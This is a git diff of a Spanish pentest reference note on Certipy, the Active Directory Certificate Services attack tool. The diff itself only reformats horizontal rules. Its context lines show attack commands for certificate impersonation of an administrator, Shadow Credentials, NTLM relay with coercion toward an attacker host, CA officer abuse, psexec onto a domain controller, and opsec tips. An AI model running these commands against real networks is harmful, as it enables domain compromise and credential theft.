@@ -26,7 +26,7 @@ linked:
 ---
 # Certipy
 
-***
+---
 
 ## Overview
 
@@ -36,7 +36,7 @@ Install: `pipx install certipy-ad` → binario `certipy`.
 
 > Regla: Certipy acepta `-u user@domain`, `-p pass`, `-hashes :NT`, `-k` (Kerberos ccache), `-aes <key>`. Todas las operaciones soportan PtH y PtT.
 
-***
+---
 
 ## Sintaxis base
 
@@ -47,7 +47,7 @@ certipy <subcommand> -u user@domain.local -k -no-pass -dc-ip <dc>   # ccache
 certipy <subcommand> -u user@domain.local -aes <aes256> -dc-ip <dc>
 ```
 
-***
+---
 
 ## find — enumeración
 
@@ -81,7 +81,7 @@ Output (textmode) muestra:
 - Templates + autorización + configuración por flag vulnerable.
 - Clasificación automática: ESC1, ESC2, ESC3, ESC4, ESC5, ESC6, ESC7, ESC8, ESC9, ESC10, ESC11, ESC13, ESC14, ESC15.
 
-***
+---
 
 ## req — request certificate (ESC1, ESC2, ESC3, ESC15)
 
@@ -123,7 +123,7 @@ certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'WebServer' \
   -upn 'administrator@domain.local' -application-policies 'Client Authentication'
 ```
 
-***
+---
 
 ## auth — usar cert para obtener TGT + NThash
 
@@ -147,7 +147,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-psexec -k -no-pass administrator@dc01.domain.local
 ```
 
-***
+---
 
 ## shadow — Shadow Credentials (msDS-KeyCredentialLink)
 
@@ -166,7 +166,7 @@ certipy shadow clear -u user@domain.local -p pass -account victim -dc-ip <dc>
 
 Ver [[Shadow Credentials]].
 
-***
+---
 
 ## relay — ntlmrelayx-style ADCS attack (ESC8)
 
@@ -191,7 +191,7 @@ coercer coerce -u user -p pass -l <attacker> -t <target>
 
 Ver [[NTLM Relay]] / [[Authentication Coercion]].
 
-***
+---
 
 ## ca — administración CA (ESC7: ManageCA/ManageCertificates)
 
@@ -221,7 +221,7 @@ certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -remove-officer attacker
 certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -backup
 ```
 
-***
+---
 
 ## account — manipular cuentas vía LDAP
 
@@ -246,7 +246,7 @@ certipy account add-key -u user@domain.local -p pass -user victim -dc-ip <dc>
 certipy account delete -u user@domain.local -p pass -user 'FAKE$' -dc-ip <dc>
 ```
 
-***
+---
 
 ## cert — manipulación de PFX / PEM
 
@@ -265,7 +265,7 @@ certipy cert -pfx admin.pfx -password 'old' -export -out admin-new.pfx -password
 certipy cert -pfx admin.pfx -info
 ```
 
-***
+---
 
 ## parse — parsear output `.zip` de Certify/SharpHound
 
@@ -273,7 +273,7 @@ certipy cert -pfx admin.pfx -info
 certipy parse -file certify.zip -out parsed.json
 ```
 
-***
+---
 
 ## template — abuse de WriteProperty en template (ESC4)
 
@@ -290,7 +290,7 @@ certipy template -u user@domain.local -p pass -template 'VulnTemplate' \
   -configuration template.json
 ```
 
-***
+---
 
 ## Matriz ESC → comando Certipy
 
@@ -311,7 +311,7 @@ certipy template -u user@domain.local -p pass -template 'VulnTemplate' \
 | ESC14 | Weak explicit mapping via altSecurityIdentities | `account update -alt-security-identities ...` |
 | ESC15 | EKUwu — schema v1 + client EKU | `req -application-policies "Client Authentication"` |
 
-***
+---
 
 ## Workflow end-to-end típico (ESC1)
 
@@ -331,7 +331,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-psexec -k -no-pass administrator@dc01.domain.local
 ```
 
-***
+---
 
 ## Opsec
 
@@ -340,7 +340,7 @@ impacket-psexec -k -no-pass administrator@dc01.domain.local
 - `relay` genera tráfico HTTP al certsrv endpoint — visible en IIS logs.
 - Preferir AES templates sobre RC4 si CA soporta.
 
-***
+---
 
 ## Referencias
 
